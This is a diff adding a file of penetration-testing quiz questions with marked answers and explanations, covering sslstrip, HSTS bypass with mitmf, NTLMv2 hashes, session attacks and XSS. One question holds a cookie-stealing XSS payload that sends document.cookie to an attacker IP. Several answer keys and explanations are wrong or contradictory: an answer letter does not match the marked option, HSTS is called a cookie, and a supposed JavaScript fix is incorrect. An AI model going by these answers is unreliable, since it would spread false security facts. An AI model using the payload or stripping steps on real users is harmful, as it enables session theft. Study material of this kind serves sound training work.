@@ -1,0 +1,193 @@
+During the penetration testing in company “Credit Cards Rus Ltd.” Marin was using the sslstrip tool in order to sniff HTTPS traffic. Knowing that HTTPS traffic is encrypted and cannot be sniffed normally, explain the reason why it is possible to see the traffic in cleartext.
+
+
+
+      Sslstrip tool is exploiting certificate signing and it is sending its own certificate instead of the original one, allowing for the traffic to be easily decrypted
+
+      Sslstrip tool is exploiting an older or in HTTPS protocol, allowing it to gracefully decrypt http traffic by intercepting HTTP 403 denied messages and sending user HTTP 200 OK messages
+
+      TRUE :
+      Sslstrip tool is exploiting user behavior and if a user does not type https:// in front of the link, and the website has redirection from HTTP to HTTPS, it will intercept HTTP 302 redirection and send the user exactly what the user asked for, i.e. HTTPsite
+
+      Sslstrip tool is exploiting network bug, which allows it to decrypt HTTPS protocols (TLS and SSL) by sending gratuitous ARP packets to all the nodes on the network
+
+Explanation:
+
+The correct answer is “a” because sslstrip is intercepting 302 REDIRECT messages if the traffic is not initially encrypted.
+If the traffic is initially encrypted because the user has typed https:// in front of the link – Sslstrip cannot see the traffic.
+
+-------------------------------------------
+
+During the penetration testing in company “Credit Cards Rus Ltd.” Marin was using sslstrip tool in order to sniff HTTP traffic. Unfortunately, no data was received. Marin double checked the setup, tested the setup between his virtual machines, and was successful in intercepting the traffic here, but when he tried to do it against other machines on the same network, nothing happened. Marin was puzzled with that and he did not understand why that was happening. Help Marin and explain why he was unsuccessful with intercepting the traffic with sslstrip?
+
+
+
+Marin cannot use sslstrip on the real network—it works only between virtual machines
+
+Marin was using the wrong tool. To decrypt the https traffic, he should have used httpsdecrypt instead
+
+Sslstrip can show the data only if the initial request to the server is sent as HTTP. : TRUE
+
+Sslstrip can show only GET requests—in this case, all the client/server communication was using POST requests
+
+
+------------------------------------
+
+Marin was using sslstrip tool for many years  against most of the websites, like Gmail, Facebook, Twitter, etc.
+
+He was supposed to give a demo on internet (in)security and wanted to show a demo where he can intercept 302 redirects between his machine and Gmail server.
+
+But unfortunately it does not work anymore.
+
+He tried the same on Facebook and Twitter and the result was the same.
+
+He then tried to do it on the company OWA (Outlook Web Access) deployment and it worked!
+
+He now wants to use it against Gmail in his demo because CISO thinks that security through obscurity is a best way to a secure system (obviously BAD CISO) and demonstrating something like that on company live system is not allowed.
+
+How can Marin use sslstrip or similar tool to strip S from HTTP?
+
+
+
+          Marin can use mitmf tool with sslstrip+ and dnsspoof modules. He can use any web browser he wants because sslstrip+ can go around HSTS without any additional tool or setting.
+
+          There is no option which will allow Marin to do that, since HSTS prevents this type of attacks.
+
+          TRUE:
+          Marin can use mitmf tool with sslstrip+ and dnsspoof modules. He should use IE in “InPrivate browsing” mode to ignore the HSTS cookie if the cookie was already stored on his machine, or he can use some older browser version (IE, Firefox, Chrome, Safari, Opera, …) which didn’t use the HSTS cookies.
+
+          Marin can use sslstripHSTS tool to do this.
+
+Explanation:
+HSTS protection is basically the cookie that the website issues to the web browser, when user visits the website for the first time.
+It’s long term cookie, which means that it will not expire.
+If the cookie is set – web browser prevents visiting the website over HTTP connection.
+So, by using sslstrip+ with dnsspoof module, one can effectively combat the protection if the user NEVER visited this website before.
+That’s why he has to use IE in InPrivate browsing mode because it will not read the HSTS cookie. This is NOT the case with Firefox or Chrome though!
+
+SslstripHSTS tool does not exist.
+
+
+--------------------------
+
+Marin is using the mitmf tool during a penetration test and after few minutes this is what pops up on the screen.
+
+A few seconds later though, the hash is different.
+
+
+            This is Microsoft NTLMv2 hash. It’s different because user is visiting another website. Each website will have its own unique hash.
+
+            This is Microsoft NTLMv2 hash—it’s salted, so it will be different for every new request. : TRUE
+
+            This is Microsoft NTLMv2 hash. It’s different because user changed the password in the meantime.
+
+            This is Microsoft NTLMv2 hash. It’s different because this is another user accessing the website.
+
+  Explanation:
+
+  NTLMv2 hash is salted, so it will change with each new request. Salting is a cryptographic technique of randomizing the data. NTLMv2 hashes keep randomly changing on each new request.
+
+  It has nothing to do with another user accessing the website.
+
+  It has also nothing to do with user visiting another website
+
+  No—practically a user cannot change the password in one second difference
+
+
+  -------------------------------------
+
+  During a penetration test, Marin discovered that a web application does not change the session cookie after successful login. Instead, the cookie stays the same and is allowed additional privileges. This vulnerability and application-level session hijacking is called ______________.
+
+
+        Session replay attack
+
+        Session sniffing
+
+        Session fixation :
+                vulnerability where the attacker can
+                          connect to the server,
+                          receive the cookie, and
+                          then try to use this cookie in social engineering or some other attack,
+                    provoking the user to login.
+                When the user logs in, the session becomes active and the attacker has access to the user session even without knowing the username and password.
+
+        Predictable session token
+
+------------------------------------------
+
+During a penetration test, Marin discovered a session token that had had the content: 20170801135433_Robert.
+
+Why is this session token weak,
+and what is the name used for this type of vulnerability?
+
+
+          Date/Time Session Token
+
+          Captured Session Token
+
+          Predictable Session Token : TRUE
+
+          Unknown Session Token
+
+
+Explanation:
+
+Compromising Session IDs by Predicting Session Token
+
+A session ID is tagged as a proof of the authenticated session established between a user and a Web server.
+Thus, if an attacker is able to guess or predict the session ID of the user, fraudulent activity is possible.
+
+Session prediction enables an attacker to bypass the authentication schema of an application. Usually, attackers can predict session IDs generated by weak algorithms and impersonate a website user.
+Attackers perform analysis of variable section of session IDs to determine the existence of a pattern.
+She/he performs this analysis either manually or by using various cryptanalytic tools.
+
+The correct answer is “predictable session token,” which means that someone can easily guess the possible token combinations. Iterating through possible combinations, attacker will (in this case) stumble upon active session in no time.
+
+--------------------------
+
+Marin is performing penetration testing on the target organization.
+
+He discovered some vulnerabilities in the organization’s website.
+
+He decided to insert
+       malicious JavaScript code into a vulnerable dynamic web page
+to collect information such as credentials, cookies, etc.
+
+Identify the attack performed by Marin?
+
+
+        Session Replay Attack
+
+        Man-in-the-Browser Attack
+
+        Cross-site Request Forgery Attack
+
+        Cross-site Scripting Attack : TRUE
+
+
+---------------------------------------
+
+Luka is a black hat hacker trying to compromise a victim’s computer session.
+
+The attack he is trying to do is called stored XSS,
+and he is expecting to see an active user’s session tokens in his web server logs.
+
+ The command that Luka is using is given below:
+
+<script>new image().src="http://192.168.111.111/?a="+document.cookie<script>
+
+What is wrong with this command?
+
+
+        This is JavaScript, and Java is a case sensitive language, so img has to be written with uppercase I, like this: Img().src.
+
+        This is JavaScript, and Java is a case-sensitive language, so img has to be written with uppercase I, like this: Img().src,
+        and
+        <script> tag is not correctly closed it has to be closed like this:</script> : TRUE
+
+        Everything is OK with this code—Luka did not start the web server, that is why either he did not receive any user session data, or the IP in the command was wrong, or there was a firewall blocking the traffic.
+
+        <script> tag is not correctly closed it has to be closed like this: </script>
+
+
+------------------------------------
